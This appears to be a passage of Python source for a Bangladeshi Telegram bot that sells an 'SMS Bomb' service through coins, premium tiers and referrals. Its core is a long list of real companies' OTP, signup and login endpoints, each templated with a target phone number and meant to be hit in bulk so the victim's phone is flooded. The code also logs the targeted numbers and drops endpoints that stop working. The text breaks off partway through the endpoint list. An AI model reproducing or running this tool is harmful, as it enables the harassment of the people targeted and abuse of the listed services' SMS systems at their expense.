import os
import json
import time
import random
import sqlite3
import requests
import asyncio
import logging
import concurrent.futures
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes, ConversationHandler
from telegram.error import TelegramError, BadRequest

# ====================== লগিং সেটআপ ======================

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO,
    handlers=[
        logging.FileHandler("bot.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# ====================== ডাটাবেস সেটআপ ======================

class Database:
    def __init__(self, db_file="users.db"):
        self.conn = sqlite3.connect(db_file, check_same_thread=False)
        self.conn.row_factory = sqlite3.Row
        self.cursor = self.conn.cursor()
        self.create_tables()
        self.migrate_database()
    
    def create_tables(self):
        """সব টেবিল তৈরি করুন"""
        # ইউজার টেবিল
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS users (
                user_id INTEGER PRIMARY KEY,
                username TEXT,
                first_name TEXT,
                last_name TEXT,
                coins INTEGER DEFAULT 10,
                total_sent INTEGER DEFAULT 0,
                join_date TEXT,
                last_active TEXT,
                is_banned INTEGER DEFAULT 0,
                is_premium INTEGER DEFAULT 0,
                premium_expiry TEXT,
                is_free_trial INTEGER DEFAULT 0,
                free_trial_expiry TEXT,
                language TEXT DEFAULT 'bn',
                notifications INTEGER DEFAULT 1,
                total_achievements INTEGER DEFAULT 0
            )
        ''')
        
        # লগ টেবিল
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER,
                phone TEXT,
                api_count INTEGER,
                success_count INTEGER,
                timestamp TEXT
            )
        ''')
        
        # রেফারেল টেবিল
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS referrals (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                referrer_id INTEGER,
                referred_id INTEGER,
                timestamp TEXT
            )
        ''')
        
        # অ্যাচিভমেন্ট টেবিল
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS achievements (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER,
                achievement_key TEXT,
                achievement_name TEXT,
                earned_date TEXT,
                UNIQUE(user_id, achievement_key)
            )
        ''')
        
        # অ্যাডমিন সেটিংস টেবিল
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS admin_settings (
                key TEXT PRIMARY KEY,
                value TEXT
            )
        ''')
        
        # API স্ট্যাটস টেবিল
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS api_stats (
                api_name TEXT,
                total_calls INTEGER DEFAULT 0,
                success_calls INTEGER DEFAULT 0,
                fail_calls INTEGER DEFAULT 0,
                last_used TEXT,
                is_active INTEGER DEFAULT 1,
                PRIMARY KEY (api_name)
            )
        ''')
        
        # কাস্টম API টেবিল
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS custom_apis (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER,
                name TEXT,
                url TEXT,
                method TEXT,
                headers TEXT,
                body TEXT,
                created_at TEXT,
                is_active INTEGER DEFAULT 1
            )
        ''')
        
        # ফ্রি ট্রায়াল টেবিল
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS free_trials (
                user_id INTEGER PRIMARY KEY,
                api_id INTEGER,
                start_date TEXT,
                end_date TEXT
            )
        ''')
        
        # ফোর্স জয়েন চ্যানেল টেবিল
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS force_join_channels (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                channel_id TEXT,
                channel_username TEXT,
                channel_name TEXT,
                is_active INTEGER DEFAULT 1,
                added_date TEXT
            )
        ''')
        
        # ফোর্স জয়েন সেটিংস
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS force_join_settings (
                key TEXT PRIMARY KEY,
                value TEXT
            )
        ''')
        
        # ব্রডকাস্ট হিস্টোরি
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS broadcast_history (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                admin_id INTEGER,
                message TEXT,
                total_users INTEGER,
                success_count INTEGER,
                fail_count INTEGER,
                timestamp TEXT
            )
        ''')
        
        # ইউজার সেটিংস
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS user_settings (
                user_id INTEGER PRIMARY KEY,
                notifications INTEGER DEFAULT 1,
                language TEXT DEFAULT 'bn',
                auto_delete_logs INTEGER DEFAULT 0
            )
        ''')
        
        self.conn.commit()
    
    def migrate_database(self):
        """পুরনো ডাটাবেস থেকে নতুন কলাম যোগ করুন"""
        try:
            # users টেবিলে নতুন কলাম যোগ করুন যদি না থাকে
            self.cursor.execute("PRAGMA table_info(users)")
            columns = [col[1] for col in self.cursor.fetchall()]
            
            if 'last_name' not in columns:
                self.cursor.execute("ALTER TABLE users ADD COLUMN last_name TEXT")
            if 'premium_expiry' not in columns:
                self.cursor.execute("ALTER TABLE users ADD COLUMN premium_expiry TEXT")
            if 'notifications' not in columns:
                self.cursor.execute("ALTER TABLE users ADD COLUMN notifications INTEGER DEFAULT 1")
            if 'total_achievements' not in columns:
                self.cursor.execute("ALTER TABLE users ADD COLUMN total_achievements INTEGER DEFAULT 0")
            
            # api_stats টেবিলে নতুন কলাম
            self.cursor.execute("PRAGMA table_info(api_stats)")
            columns = [col[1] for col in self.cursor.fetchall()]
            if 'fail_calls' not in columns:
                self.cursor.execute("ALTER TABLE api_stats ADD COLUMN fail_calls INTEGER DEFAULT 0")
            if 'is_active' not in columns:
                self.cursor.execute("ALTER TABLE api_stats ADD COLUMN is_active INTEGER DEFAULT 1")
            
            self.conn.commit()
        except Exception as e:
            logger.error(f"Migration error: {e}")
    
    def get_user(self, user_id):
        """ইউজার তথ্য পান"""
        self.cursor.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
        return self.cursor.fetchone()
    
    def add_user(self, user_id, username, first_name, last_name=None):
        """নতুন ইউজার যোগ করুন"""
        now = datetime.now().isoformat()
        self.cursor.execute('''
            INSERT OR IGNORE INTO users 
            (user_id, username, first_name, last_name, coins, join_date, last_active)
            VALUES (?, ?, ?, ?, 10, ?, ?)
        ''', (user_id, username, first_name, last_name, now, now))
        self.conn.commit()
        
        # ইউজার সেটিংস যোগ করুন
        self.cursor.execute('''
            INSERT OR IGNORE INTO user_settings (user_id, notifications, language)
            VALUES (?, 1, 'bn')
        ''', (user_id,))
        self.conn.commit()
    
    def update_last_active(self, user_id):
        """শেষ অ্যাক্টিভিটি আপডেট করুন"""
        now = datetime.now().isoformat()
        self.cursor.execute("UPDATE users SET last_active = ? WHERE user_id = ?", (now, user_id))
        self.conn.commit()
    
    def update_coins(self, user_id, coins):
        """কয়েন আপডেট করুন"""
        self.cursor.execute("UPDATE users SET coins = coins + ? WHERE user_id = ?", (coins, user_id))
        self.conn.commit()
    
    def get_coins(self, user_id):
        """কয়েন পান"""
        self.cursor.execute("SELECT coins FROM users WHERE user_id = ?", (user_id,))
        result = self.cursor.fetchone()
        return result['coins'] if result else 0
    
    def add_log(self, user_id, phone, api_count, success_count):
        """লগ যোগ করুন"""
        now = datetime.now().isoformat()
        self.cursor.execute('''
            INSERT INTO logs (user_id, phone, api_count, success_count, timestamp)
            VALUES (?, ?, ?, ?, ?)
        ''', (user_id, phone, api_count, success_count, now))
        self.conn.commit()
    
    def get_user_stats(self, user_id):
        """ইউজার স্ট্যাটস পান"""
        self.cursor.execute("""
            SELECT total_sent, coins, is_premium, is_free_trial, join_date 
            FROM users WHERE user_id = ?
        """, (user_id,))
        return self.cursor.fetchone()
    
    def update_api_stats(self, api_name, success):
        """API স্ট্যাটস আপডেট করুন"""
        self.cursor.execute('''
            INSERT INTO api_stats (api_name, total_calls, success_calls, fail_calls, last_used, is_active)
            VALUES (?, 1, ?, ?, ?, 1)
            ON CONFLICT(api_name) DO UPDATE SET
                total_calls = total_calls + 1,
                success_calls = success_calls + ?,
                fail_calls = fail_calls + ?,
                last_used = ?
        ''', (
            api_name, 
            1 if success else 0, 
            0 if success else 1,
            datetime.now().isoformat(),
            1 if success else 0,
            0 if success else 1,
            datetime.now().isoformat()
        ))
        self.conn.commit()
    
    def check_and_remove_dead_apis(self):
        """ডেড API গুলো অটো ডিটেক্ট করে ডিলিট করুন"""
        self.cursor.execute("""
            SELECT api_name, total_calls, fail_calls, last_used
            FROM api_stats 
            WHERE total_calls >= 5 AND is_active = 1
        """)
        apis = self.cursor.fetchall()
        
        removed_apis = []
        for api in apis:
            total = api['total_calls']
            fails = api['fail_calls']
            fail_rate = (fails / total * 100) if total > 0 else 0
            
            # ৮০% এর বেশি ফেইল হলে API ডিলিট করুন
            if fail_rate > 80:
                self.cursor.execute("UPDATE api_stats SET is_active = 0 WHERE api_name = ?", (api['api_name'],))
                removed_apis.append(api['api_name'])
                
                # ৭ দিনের বেশি পুরনো হলে সম্পূর্ণ ডিলিট
                last_used = datetime.fromisoformat(api['last_used']) if api['last_used'] else datetime.now()
                if (datetime.now() - last_used).days > 7:
                    self.cursor.execute("DELETE FROM api_stats WHERE api_name = ?", (api['api_name'],))
        
        self.conn.commit()
        return removed_apis
    
    def get_active_apis_count(self):
        """সক্রিয় API সংখ্যা পান"""
        self.cursor.execute("SELECT COUNT(*) as count FROM api_stats WHERE is_active = 1")
        result = self.cursor.fetchone()
        return result['count'] if result else 0
    
    def add_free_trial(self, user_id, api_id):
        """ফ্রি ট্রায়াল যোগ করুন"""
        now = datetime.now().isoformat()
        end_date = (datetime.now() + timedelta(days=1)).isoformat()
        self.cursor.execute('''
            INSERT OR REPLACE INTO free_trials (user_id, api_id, start_date, end_date)
            VALUES (?, ?, ?, ?)
        ''', (user_id, api_id, now, end_date))
        self.cursor.execute("UPDATE users SET is_free_trial = 1, free_trial_expiry = ? WHERE user_id = ?", (end_date, user_id))
        self.conn.commit()
    
    def check_free_trial(self, user_id):
        """ফ্রি ট্রায়াল চেক করুন"""
        self.cursor.execute("SELECT is_free_trial, free_trial_expiry FROM users WHERE user_id = ?", (user_id,))
        result = self.cursor.fetchone()
        if result and result['is_free_trial'] == 1:
            try:
                expiry = datetime.fromisoformat(result['free_trial_expiry'])
                if datetime.now() < expiry:
                    return True
                else:
                    self.cursor.execute("UPDATE users SET is_free_trial = 0 WHERE user_id = ?", (user_id,))
                    self.conn.commit()
            except:
                pass
        return False
    
    def ban_user(self, user_id):
        """ইউজার ব্যান করুন"""
        self.cursor.execute("UPDATE users SET is_banned = 1 WHERE user_id = ?", (user_id,))
        self.conn.commit()
    
    def unban_user(self, user_id):
        """ইউজার আনব্যান করুন"""
        self.cursor.execute("UPDATE users SET is_banned = 0 WHERE user_id = ?", (user_id,))
        self.conn.commit()
    
    def is_banned(self, user_id):
        """ব্যান চেক করুন"""
        self.cursor.execute("SELECT is_banned FROM users WHERE user_id = ?", (user_id,))
        result = self.cursor.fetchone()
        return result['is_banned'] == 1 if result else False
    
    def add_force_join_channel(self, channel_id, channel_username, channel_name):
        """ফোর্স জয়েন চ্যানেল যোগ করুন"""
        now = datetime.now().isoformat()
        self.cursor.execute('''
            INSERT INTO force_join_channels (channel_id, channel_username, channel_name, is_active, added_date)
            VALUES (?, ?, ?, 1, ?)
        ''', (channel_id, channel_username, channel_name, now))
        self.conn.commit()
    
    def remove_force_join_channel(self, channel_id):
        """ফোর্স জয়েন চ্যানেল রিমুভ করুন"""
        self.cursor.execute("DELETE FROM force_join_channels WHERE channel_id = ?", (channel_id,))
        self.conn.commit()
    
    def get_force_join_channels(self):
        """সব ফোর্স জয়েন চ্যানেল পান"""
        self.cursor.execute("SELECT * FROM force_join_channels WHERE is_active = 1")
        return self.cursor.fetchall()
    
    def set_force_join_enabled(self, enabled):
        """ফোর্স জয়েন এনাবল/ডিসএবল করুন"""
        self.cursor.execute('''
            INSERT OR REPLACE INTO force_join_settings (key, value)
            VALUES ('enabled', ?)
        ''', (str(enabled),))
        self.conn.commit()
    
    def is_force_join_enabled(self):
        """ফোর্স জয়েন স্ট্যাটাস চেক করুন"""
        self.cursor.execute("SELECT value FROM force_join_settings WHERE key = 'enabled'")
        result = self.cursor.fetchone()
        return result['value'] == 'True' if result else True
    
    def add_broadcast_history(self, admin_id, message, total_users, success_count, fail_count):
        """ব্রডকাস্ট হিস্টোরি যোগ করুন"""
        now = datetime.now().isoformat()
        self.cursor.execute('''
            INSERT INTO broadcast_history (admin_id, message, total_users, success_count, fail_count, timestamp)
            VALUES (?, ?, ?, ?, ?, ?)
        ''', (admin_id, message, total_users, success_count, fail_count, now))
        self.conn.commit()
    
    def get_dashboard_stats(self):
        """ড্যাশবোর্ড স্ট্যাটস পান"""
        stats = {}
        
        # মোট ইউজার
        self.cursor.execute("SELECT COUNT(*) as count FROM users")
        stats['total_users'] = self.cursor.fetchone()['count']
        
        # আজকের ইউজার
        self.cursor.execute("SELECT COUNT(*) as count FROM users WHERE date(join_date) = date('now')")
        stats['today_users'] = self.cursor.fetchone()['count']
        
        # গতকালের ইউজার
        self.cursor.execute("SELECT COUNT(*) as count FROM users WHERE date(join_date) = date('now', '-1 day')")
        stats['yesterday_users'] = self.cursor.fetchone()['count']
        
        # অ্যাক্টিভ ইউজার (২৪ ঘন্টায়)
        self.cursor.execute("SELECT COUNT(*) as count FROM users WHERE datetime(last_active) > datetime('now', '-1 day')")
        stats['active_users'] = self.cursor.fetchone()['count']
        
        # প্রিমিয়াম ইউজার
        self.cursor.execute("SELECT COUNT(*) as count FROM users WHERE is_premium = 1")
        stats['premium_users'] = self.cursor.fetchone()['count']
        
        # ফ্রি ট্রায়াল ইউজার
        self.cursor.execute("SELECT COUNT(*) as count FROM users WHERE is_free_trial = 1")
        stats['free_trial_users'] = self.cursor.fetchone()['count']
        
        # ব্যান ইউজার
        self.cursor.execute("SELECT COUNT(*) as count FROM users WHERE is_banned = 1")
        stats['banned_users'] = self.cursor.fetchone()['count']
        
        # মোট SMS
        self.cursor.execute("SELECT SUM(total_sent) as total FROM users")
        result = self.cursor.fetchone()
        stats['total_sms'] = result['total'] if result and result['total'] else 0
        
        # মোট কয়েন
        self.cursor.execute("SELECT SUM(coins) as total FROM users")
        result = self.cursor.fetchone()
        stats['total_coins'] = result['total'] if result and result['total'] else 0
        
        return stats
    
    def get_top_users(self, limit=10):
        """টপ ইউজার পান"""
        self.cursor.execute("""
            SELECT user_id, username, first_name, total_sent, coins 
            FROM users 
            WHERE total_sent > 0
            ORDER BY total_sent DESC 
            LIMIT ?
        """, (limit,))
        return self.cursor.fetchall()
    
    def search_user(self, query):
        """ইউজার খুঁজুন"""
        self.cursor.execute("""
            SELECT * FROM users 
            WHERE user_id = ? OR username LIKE ? OR first_name LIKE ?
        """, (query if query.isdigit() else 0, f"%{query}%", f"%{query}%"))
        return self.cursor.fetchone()
    
    def get_user_achievements(self, user_id):
        """ইউজারের অ্যাচিভমেন্ট পান"""
        self.cursor.execute("""
            SELECT achievement_key, achievement_name, earned_date 
            FROM achievements 
            WHERE user_id = ?
            ORDER BY earned_date DESC
        """, (user_id,))
        return self.cursor.fetchall()
    
    def get_user_logs(self, user_id, limit=10):
        """ইউজারের লগ পান"""
        self.cursor.execute("""
            SELECT * FROM logs 
            WHERE user_id = ?
            ORDER BY timestamp DESC
            LIMIT ?
        """, (user_id, limit))
        return self.cursor.fetchall()
    
    def get_notification_preference(self, user_id):
        """নোটিফিকেশন প্রেফারেন্স পান"""
        self.cursor.execute("SELECT notifications, language FROM user_settings WHERE user_id = ?", (user_id,))
        return self.cursor.fetchone()
    
    def update_notification_preference(self, user_id, enabled):
        """নোটিফিকেশন প্রেফারেন্স আপডেট করুন"""
        self.cursor.execute('''
            INSERT OR REPLACE INTO user_settings (user_id, notifications, language)
            VALUES (?, ?, COALESCE((SELECT language FROM user_settings WHERE user_id = ?), 'bn'))
        ''', (user_id, 1 if enabled else 0, user_id))
        self.conn.commit()
    
    def close(self):
        """ডাটাবেস বন্ধ করুন"""
        self.conn.close()

# ====================== ভাষা ডিকশনারি ======================

LANGUAGES = {
    "bn": {
        "welcome": "👋 হ্যালো {name}!",
        "send_bomb": "📱 SMS বোমা",
        "coins": "🪙 কয়েন",
        "stats": "📊 স্ট্যাটাস",
        "premium": "⭐ প্রিমিয়াম",
        "help": "📖 সাহায্য",
        "refer": "👥 রেফার",
        "leaderboard": "🏆 লিডারবোর্ড",
        "custom_api": "🔧 কাস্টম API",
        "back": "🔙 ব্যাক",
        "cancel": "❌ বাতিল",
        "free_trial": "🎁 ফ্রি ট্রায়াল",
        "profile": "👤 প্রোফাইল",
        "settings": "⚙️ সেটিংস"
    },
    "en": {
        "welcome": "👋 Hello {name}!",
        "send_bomb": "📱 SMS Bomb",
        "coins": "🪙 Coins",
        "stats": "📊 Stats",
        "premium": "⭐ Premium",
        "help": "📖 Help",
        "refer": "👥 Refer",
        "leaderboard": "🏆 Leaderboard",
        "custom_api": "🔧 Custom API",
        "back": "🔙 Back",
        "cancel": "❌ Cancel",
        "free_trial": "🎁 Free Trial",
        "profile": "👤 Profile",
        "settings": "⚙️ Settings"
    }
}

# ====================== API ম্যানেজার ======================

class ApiManager:
    def __init__(self, db):
        self.db = db
        self.base_apis = self._get_base_apis()
    
    def _get_base_apis(self):
        """বেস API গুলো পান"""
        return [
            {"name": "RedX Signup", "url": "https://api.redx.com.bd/v1/user/signup", "method": "POST", 
             "headers": {"Content-Type": "application/json"}, "body": {"phoneNumber": "{phone}"}},
            {"name": "KhaasFood OTP", "url": "https://api.khaasfood.com/api/app/one-time-passwords/token?username={phone}", 
             "method": "GET", "headers": {"User-Agent": "Mozilla/5.0"}},
            {"name": "Bioscope Login", "url": "https://api-dynamic.bioscopelive.com/v2/auth/login", 
             "method": "POST", "headers": {"Content-Type": "application/json"}, 
             "body": {"number": "+88{phone}"}},
            {"name": "Bikroy Login", "url": "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={phone}", 
             "method": "GET", "headers": {"Accept": "application/json"}},
            {"name": "Proiojon Signup", "url": "https://billing.proiojon.com/api/v1/auth/sign-up", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"phone": "{phone}"}},
            {"name": "BeautyBooth Signup", "url": "https://admin.beautybooth.com.bd/api/v2/auth/signup", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"phone": "{phone}"}},
            {"name": "Medha OTP", "url": "https://developer.medha.info/api/send-otp", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"phone": "880{phone}"}},
            {"name": "Deeptoplay Login", "url": "https://api.deeptoplay.com/v2/auth/login", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"number": "+88{phone}"}},
            {"name": "Robi OTP", "url": "https://webapi.robi.com.bd/v1/send-otp", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"phone_number": "{phone}"}},
            {"name": "Arogga SMS", "url": "https://api.arogga.com/auth/v1/sms/send", 
             "method": "POST", "headers": {"Content-Type": "multipart/form-data"},
             "body": {"mobile": "{phone}"}},
            {"name": "MyGP OTP", "url": "https://api.mygp.cinematic.mobi/api/v1/send-common-otp/{phone}", 
             "method": "GET", "headers": {"Accept": "application/json"}},
            {"name": "BDSTall OTP", "url": "https://www.bdstall.com/userRegistration/save_otp_info/", 
             "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"},
             "body": {"Mobile": "{phone}"}},
            {"name": "BCS Exam OTP", "url": "https://bcsexamaid.com/api/generateotp", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"mobile": "{phone}"}},
            {"name": "DoctorLive OTP", "url": "https://doctorlivebd.com/api/patient/auth/otpsend", 
             "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"},
             "body": {"mobile": "{phone}"}},
            {"name": "Sheba OTP", "url": "https://accountkit.sheba.xyz/api/shoot-otp", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"mobile": "+88{phone}"}},
            {"name": "Apex4U Login", "url": "https://api.apex4u.com/api/auth/login", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"phoneNumber": "{phone}"}},
            {"name": "Sindabad OTP", "url": "https://offers.sindabad.com/api/mobile-otp", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"mobile": "+88{phone}"}},
            {"name": "Kirei OTP", "url": "https://app.kireibd.com/api/v2/send-login-otp", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"email": "{phone}"}},
            {"name": "Shikho SMS", "url": "https://api.shikho.com/auth/v2/send/sms", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"phone": "{phone}"}},
            {"name": "Circle Signup", "url": "https://reseller.circle.com.bd/api/v2/auth/signup", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"email_or_phone": "+88{phone}"}},
            {"name": "BDTickets Auth", "url": "https://api.bdtickets.com:20100/v1/auth", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"phoneNumber": "+88{phone}"}},
            {"name": "Grameenphone OTP", "url": "https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"phone": "{phone}"}},
            {"name": "RFL BestBuy Login", "url": "https://rflbestbuy.com/api/login/", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"phone": "{phone}"}},
            {"name": "Chorki Login", "url": "https://api-dynamic.chorki.com/v1/auth/login", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"number": "{phone}"}},
            {"name": "Hishab Express Login", "url": "https://api.hishabexpress.com/login/status", 
             "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"},
             "body": {"msisdn": "{phone}"}},
            {"name": "Chorcha Auth Check", "url": "https://mujib.chorcha.net/auth/check?phone={phone}", 
             "method": "GET", "headers": {"accept": "*/*"}},
            {"name": "Wafilife OTP", "url": "https://m-backend.wafilife.com/wp-json/wc/v2/send-otp?p={phone}", 
             "method": "GET", "headers": {}},
            {"name": "Robi Account OTP", "url": "https://webapi.robi.com.bd/v1/account/register/otp", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"phone_number": "{phone}"}},
            {"name": "Chardike OTP", "url": "https://api.chardike.com/api/otp/send", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"phone": "{phone}"}},
            {"name": "E-TestPaper OTP", "url": "https://prod.etestpaper.net/api/v4/auth/otp", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"phone": "{phone}"}},
            {"name": "GPay Signup", "url": "https://gpayapp.grameenphone.com/prod_mfs/sub/user/checksignup", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"msisdn": "{phone}"}},
            {"name": "Applink OTP", "url": "https://apps.applink.com.bd/appstore-v4-server/login/otp/request", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"msisdn": "88{phone}"}},
            {"name": "Priyoshikkhaloy", "url": "https://app.priyoshikkhaloy.com/api/user/register-login.php", 
             "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"},
             "body": {"mobile": "{phone}"}},
            {"name": "Kabbik OTP", "url": "https://api.kabbik.com/v1/auth/otpnew", 
             "method": "POST", "headers": {"Content-Type": "application/json"}},
            {"name": "Salextra", "url": "https://salextra.com.bd/customer/checkusernameavailabilityonregistration", 
             "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"},
             "body": {"username": "{phone}"}},
            {"name": "Sundora", "url": "https://api.sundora.com.bd/api/user/customer/", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"phone": "+880{phone}"}},
            {"name": "MyGP Cinematic", "url": "https://api.mygp.cinematic.mobi/api/v1/otp/88{phone}/", 
             "method": "POST", "headers": {"Content-Type": "application/json"}},
            {"name": "Bajistar", "url": "https://bajistar.com:1443/public/api/v1/getOtp?recipient=88{phone}", 
             "method": "GET", "headers": {}},
            {"name": "Doctime", "url": "https://api.doctime.com.bd/api/authenticate", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"contact_no": "{phone}"}},
            {"name": "Grameenphone FI", "url": "https://webloginda.grameenphone.com/backend/api/v1/otp", 
             "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"},
             "body": {"msisdn": "{phone}"}},
            {"name": "Meenabazar", "url": "https://meenabazardev.com/api/mobile/front/send/otp?CellPhone={phone}", 
             "method": "POST", "headers": {"Content-Type": "application/json"}},
            {"name": "Medeasy", "url": "https://api.medeasy.health/api/send-otp/+88{phone}/", 
             "method": "GET", "headers": {}},
            {"name": "Iqra Live", "url": "http://apibeta.iqra-live.com/api/v1/sent-otp/{phone}", 
             "method": "GET", "headers": {}},
            {"name": "Chokrojan", "url": "https://chokrojan.com/api/v1/passenger/login/mobile", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"mobile_number": "{phone}"}},
            {"name": "Shomvob", "url": "https://backend-api.shomvob.co/api/v2/otp/phone", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"phone": "88{phone}"}},
            {"name": "RedX Signup 2", "url": "https://api.redx.com.bd/v1/user/signup", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"phoneNumber": "{phone}"}},
            {"name": "MyGP Send OTP", "url": "https://api.mygp.cinematic.mobi/api/v1/send-common-otp/88{phone}/", 
             "method": "POST", "headers": {"Content-Type": "application/json"}},
            {"name": "BDJobs", "url": "https://mybdjobsorchestrator-odcx6humqq-as.a.run.app/api/CreateAccountOrchestrator/CreateAccount", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"mobile": "{phone}"}},
            {"name": "Ultimate Organic Register", "url": "https://ultimateasiteapi.com/api/register-customer", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"customer_contact": "{phone}"}},
            {"name": "Foodaholic", "url": "https://foodaholic.com.bd/api/v1/auth/forgot-password", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"phone": "+88{phone}"}},
            {"name": "KFC BD", "url": "https://api.kfcbd.com/register", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"mobile": "{phone}"}},
            {"name": "GP Offer OTP", "url": "https://bkwebsitethc.grameenphone.com/api/v1/offer/send_otp", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"msisdn": "{phone}"}},
            {"name": "Eonbazar Register", "url": "https://app.eonbazar.com/api/auth/register", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"mobile": "{phone}"}},
            {"name": "Eat-Z", "url": "https://api.eat-z.com/auth/customer/app-connect", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"username": "+880{phone}"}},
            {"name": "Osudpotro", "url": "https://api.osudpotro.com/api/v1/users/send_otp", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"mobile": "+88-{phone}"}},
            {"name": "Kormi24", "url": "https://api.kormi24.com/graphql", 
             "method": "POST", "headers": {"Content-Type": "application/json"}},
            {"name": "Weblogin GP", "url": "https://weblogin.grameenphone.com/backend/api/v1/otp", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"msisdn": "{phone}"}},
            {"name": "Shwapno", "url": "https://www.shwapno.com/api/auth", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"phoneNumber": "+88{phone}"}},
            {"name": "Quizgiri", "url": "https://developer.quizgiri.xyz/api/v2.0/send-otp", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"phone": "{phone}"}},
            {"name": "Banglalink MyBL", "url": "https://myblapi.banglalink.net/api/v1/send-otp", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"phone": "{phone}"}},
            {"name": "Walton Plaza", "url": "https://api.waltonplaza.com.bd/graphql", 
             "method": "POST", "headers": {"Content-Type": "application/json"}},
            {"name": "PBS", "url": "https://apialpha.pbs.com.bd/api/OTP/generateOTP", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"userPhone": "{phone}"}},
            {"name": "Aarong", "url": "https://mcprod.aarong.com/graphql", 
             "method": "POST", "headers": {"Content-Type": "application/json"}},
            {"name": "Arogga App", "url": "https://api.arogga.com/auth/v1/sms/send", 
             "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"},
             "body": {"mobile": "{phone}"}},
            {"name": "Sundarban Courier", "url": "https://api-gateway.sundarbancourierltd.com/graphql", 
             "method": "POST", "headers": {"Content-Type": "application/json"}},
            {"name": "QuizTime", "url": "https://developer.quiztime.gamehubbd.com/api/v2.0/send-otp", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"phone": "{phone}"}},
            {"name": "DressUp", "url": "https://dressup.com.bd/wp-json/api/flutter_user/digits/send_otp", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"mobile": "{phone}"}},
            {"name": "Ghoori Learning", "url": "https://api.ghoorilearning.com/api/auth/signup/otp", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"mobile_no": "{phone}"}},
            {"name": "Garibook", "url": "https://api.garibookadmin.com/api/v3/user/login", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"mobile": "{phone}"}},
            {"name": "Fabrilife Signup", "url": "https://fabrilife.com/api/wp-json/wc/v2/user/register", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"phone": "{phone}"}},
            {"name": "Fabrilife OTP", "url": "https://fabrilife.com/api/wp-json/wc/v2/user/phone-login/{phone}", 
             "method": "POST", "headers": {}},
